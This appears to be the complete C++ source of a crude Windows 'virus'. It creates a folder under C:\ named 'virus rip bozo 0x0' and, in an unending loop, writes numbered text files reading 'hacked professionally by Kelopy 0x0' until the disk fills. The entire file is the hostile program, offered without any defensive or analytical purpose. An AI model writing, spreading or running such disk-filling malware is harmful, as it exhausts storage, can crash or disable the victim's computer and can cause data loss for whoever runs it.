#include <iostream>
#include <fstream>
#include <string>
#include <direct.h>

using namespace std;

int main()
{
    size_t i = 0;
    const char *path = "C:\\virus rip bozo 0x0\\";
    string content = "hacked professionally by Kelopy 0x0";
    _mkdir(path);

    while (true)
    {
        i++;
        ofstream file;
        file.open(path + to_string(i) + ".txt", ios_base::out);
        file << content;
        cout << "Files created >> " + std::to_string(i) + "\r\n";
    }

}
